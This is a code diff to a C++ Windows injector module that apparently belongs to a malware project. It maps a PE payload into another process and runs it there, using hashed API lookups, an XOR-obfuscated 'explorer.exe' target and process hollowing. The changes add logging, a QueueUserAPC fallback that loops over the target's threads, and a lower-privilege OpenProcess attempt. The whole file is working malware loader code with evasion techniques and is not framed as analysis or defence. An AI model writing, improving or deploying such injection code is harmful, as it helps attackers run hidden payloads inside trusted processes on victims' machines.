@@ -1,5 +1,6 @@
 #include "Injector.h"
 #include "../utils/Logger.h"
+#include "../utils/Shared.h"
 #include "../utils/Obfuscator.h"
 #include "../utils/ApiHasher.h"
 #include <tlhelp32.h>
@@ -13,6 +14,7 @@ namespace {
     typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, PSIZE_T);
     typedef BOOL(WINAPI* pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
     typedef HANDLE(WINAPI* pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+    typedef DWORD(WINAPI* pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
 
     struct RELOC_ENTRY {
         WORD Offset : 12;
@@ -27,14 +29,20 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
     auto fVirtualProtectEx = utils::GetProcAddressH<pVirtualProtectEx>("kernel32.dll", H_VirtualProtectEx);
     auto fCreateRemoteThread = utils::GetProcAddressH<pCreateRemoteThread>("kernel32.dll", H_CreateRemoteThread);
 
-    if (!fVirtualAllocEx || !fWriteProcessMemory || !fVirtualProtectEx || !fCreateRemoteThread) return false;
+    if (!fVirtualAllocEx || !fWriteProcessMemory || !fVirtualProtectEx || !fCreateRemoteThread) {
+        LOG_ERR("MapAndInject: Failed to resolve kernel32 APIs.");
+        return false;
+    }
 
     PBYTE pSrcData = (PBYTE)payload.data();
     PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrcData;
     PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);
 
     PBYTE pTargetBase = (PBYTE)fVirtualAllocEx(hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!pTargetBase) return false;
+    if (!pTargetBase) {
+        LOG_ERR("MapAndInject: VirtualAllocEx failed. Error: " + std::to_string(GetLastError()));
+        return false;
+    }
 
     std::vector<uint8_t> localMapping(pNtHeaders->OptionalHeader.SizeOfImage);
     PBYTE pLocalBase = localMapping.data();
@@ -67,14 +75,51 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
         }
     }
 
-    if (!fWriteProcessMemory(hProcess, pTargetBase, pLocalBase, pNtHeaders->OptionalHeader.SizeOfImage, NULL)) return false;
+    if (!fWriteProcessMemory(hProcess, pTargetBase, pLocalBase, pNtHeaders->OptionalHeader.SizeOfImage, NULL)) {
+        LOG_ERR("MapAndInject: WriteProcessMemory failed. Error: " + std::to_string(GetLastError()));
+        return false;
+    }
 
     DWORD oldProtect;
-    if (!fVirtualProtectEx(hProcess, pTargetBase, pNtHeaders->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, &oldProtect)) return false;
+    if (!fVirtualProtectEx(hProcess, pTargetBase, pNtHeaders->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, &oldProtect)) {
+        LOG_ERR("MapAndInject: VirtualProtectEx failed. Error: " + std::to_string(GetLastError()));
+        return false;
+    }
 
     HANDLE hThread = fCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(pTargetBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint), NULL, 0, NULL);
-    if (!hThread) return false;
+    if (!hThread) {
+        LOG_WARN("MapAndInject: CreateRemoteThread failed. Error: " + std::to_string(GetLastError()) + ". Trying APC fallback.");
 
+        // QueueUserAPC Fallback
+        auto fQueueUserAPC = utils::GetProcAddressH<pQueueUserAPC>("kernel32.dll", H_QueueUserAPC);
+        if (fQueueUserAPC) {
+            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+            if (hSnap != INVALID_HANDLE_VALUE) {
+                THREADENTRY32 te;
+                te.dwSize = sizeof(te);
+                if (Thread32First(hSnap, &te)) {
+                    do {
+                        if (te.th32OwnerProcessID == GetProcessId(hProcess)) {
+                            HANDLE hT = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
+                            if (hT) {
+                                if (fQueueUserAPC((PAPCFUNC)(pTargetBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint), hT, 0)) {
+                                    LOG_INFO("MapAndInject: Successfully queued APC to thread " + std::to_string(te.th32ThreadID));
+                                    CloseHandle(hT);
+                                    CloseHandle(hSnap);
+                                    return true;
+                                }
+                                CloseHandle(hT);
+                            }
+                        }
+                    } while (Thread32Next(hSnap, &te));
+                }
+                CloseHandle(hSnap);
+            }
+        }
+        return false;
+    }
+
+    LOG_INFO("MapAndInject: CreateRemoteThread success.");
     CloseHandle(hThread);
     return true;
 }
@@ -86,6 +131,7 @@ bool Injector::HollowProcess(const std::wstring& targetPath, const std::vector<u
     si.cb = sizeof(si);
 
     if (!CreateProcessW(NULL, (LPWSTR)targetPath.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        LOG_ERR("HollowProcess: CreateProcessW failed. Error: " + std::to_string(GetLastError()));
         return false;
     }
 
@@ -126,15 +172,27 @@ DWORD Injector::GetProcessIdByName(const std::wstring& processName) {
 
 bool Injector::InjectIntoExplorer(const std::vector<uint8_t>& payload, const std::wstring& dropperPath) {
     (void)dropperPath;
-    // "explorer.exe" -> \x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F
-    DWORD pid = GetProcessIdByName(utils::DecryptW(L"\x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F"));
-    if (pid == 0) return false;
+    std::wstring explorer = utils::DecryptW(L"\x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F");
+    DWORD pid = GetProcessIdByName(explorer);
+    if (pid == 0) {
+        LOG_ERR("InjectIntoExplorer: " + utils::ws2s(explorer) + " not found.");
+        return false;
+    }
 
     auto fOpenProcess = utils::GetProcAddressH<decltype(&OpenProcess)>("kernel32.dll", H_OpenProcess);
     if (!fOpenProcess) return false;
 
-    HANDLE hProcess = fOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess) return false;
+    // Try with minimal rights first
+    HANDLE hProcess = fOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
+    if (!hProcess) {
+        LOG_WARN("InjectIntoExplorer: OpenProcess with minimal rights failed. Error: " + std::to_string(GetLastError()) + ". Trying PROCESS_ALL_ACCESS.");
+        hProcess = fOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    }
+
+    if (!hProcess) {
+        LOG_ERR("InjectIntoExplorer: Failed to open explorer process. Error: " + std::to_string(GetLastError()));
+        return false;
+    }
 
     bool success = MapAndInject(hProcess, payload);
     CloseHandle(hProcess);
